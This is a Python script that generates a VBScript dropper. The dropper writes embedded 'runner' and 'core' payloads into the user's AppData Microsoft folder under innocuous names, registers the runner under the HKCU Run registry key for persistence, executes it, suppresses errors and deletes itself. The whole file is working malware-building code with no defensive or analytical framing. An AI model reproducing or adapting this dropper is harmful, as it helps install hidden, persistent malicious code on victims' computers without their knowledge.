class Extracter:
	var = []
	whole_code = ""
	vbs_code = []
	runner = ""
	code = ""
	runner_name = "runner.vbs"
	core_name = "core.mds"

	def __init__(self, runner, core):
		self.runner = runner
		self.core = core

	def get_starter_lines(self):
		self.vbs_code.append('On Error Resume Next')
		self.vbs_code.append('runner = \"%s\"'%(self.runner))
		self.vbs_code.append('core = \"%s\"'%(self.core))
		self.vbs_code.append('Set fso = CreateObject(\"Scripting.FileSystemObject\")')
		self.vbs_code.append('Set oShell = CreateObject(\"WScript.Shell\")')
		self.vbs_code.append('app_path = oShell.ExpandEnvironmentStrings(\"%APPDATA%\") + \"\\Microsoft\\\"')
		self.vbs_code.append('Set oFile = fso.CreateTextFile(app_path & \"%s\", True)'%(self.runner_name))
		self.vbs_code.append('oFile.Write runner : oFile.Close')
		self.vbs_code.append('Set oFile = fso.CreateTextFile(app_path & \"%s\", True)'%(self.core_name))
		self.vbs_code.append('oFile.Write core : oFile.Close')
		self.vbs_code.append('HCU = &H80000001')
		self.vbs_code.append('strComputer = "."')
		self.vbs_code.append('Set oReg = GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\\" & strComputer & \"\\root\\default:StdRegProv\")')
		self.vbs_code.append('val_name = \"mds_vbs\" : key_path = \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\"')
		self.vbs_code.append('oReg.SetExpandedStringValue HCU, key_path, val_name, app_path & \"%s\"'%(self.runner_name))
		self.vbs_code.append('oShell.Run app_path & \"%s\"'%(self.runner_name))
		self.vbs_code.append('fso.DeleteFile WScript.ScriptFullName')

	def get_whole_code(self):
		for line in self.vbs_code:
			self.whole_code += line + '\n'

	def save_to_file(self, file_name):
		with open(file_name, 'w') as fw:
			fw.write(self.whole_code)
		print(self.whole_code)


def get_payload(payload_name):
	with open(payload_name) as fr:
		payload = fr.read()
	return payload

def main():
	e = Extracter(get_payload("runner.vbs"), get_payload("core.vbs"))
	e.get_starter_lines()
	e.get_whole_code()
	e.save_to_file("output/starter.vbs")


if __name__ == '__main__':
	main()